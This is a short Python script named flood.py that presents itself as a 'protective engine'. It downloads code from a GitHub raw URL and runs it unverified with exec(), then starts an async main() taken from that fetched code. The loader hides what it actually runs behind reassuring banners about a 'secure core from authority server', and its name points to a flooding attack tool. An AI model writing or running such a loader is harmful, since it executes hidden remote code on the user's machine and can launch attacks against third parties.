import requests
import os
import sys
import time
import asyncio


def _verify_env():
    if os.path.basename(__file__) != "flood.py":
        print("\n\033[1;31m[!] ERROR: RENAME TO flood.py\033[0m")
        sys.exit()

def _start():
    print("\n\033[1;31m[!] D-JKSY PROTECTIVE ENGINE ACTIVE\033[0m")
    print("\033[1;37m[*] Fetching secure core from authority server...\033[0m")
    
    
    CORE_URL = "https://raw.githubusercontent.com/iamkhy11/d-jksy/refs/heads/main/flood.txt"
    
    try:
        response = requests.get(CORE_URL, timeout=15)
        if response.status_code == 200:
            
            exec(response.text, globals()) 
        else:
            print(f"[!] SERVER ERROR: {response.status_code}")
            sys.exit()
    except Exception as e:
        print(f"[!] CONNECTION ERROR: {e}")
        sys.exit()

if __name__ == "__main__":
    _verify_env()
    _start()
    
    
    if 'main' in globals():
        asyncio.run(globals()['main']())
    else:
        print("[!] CRITICAL: Core functions not found.")
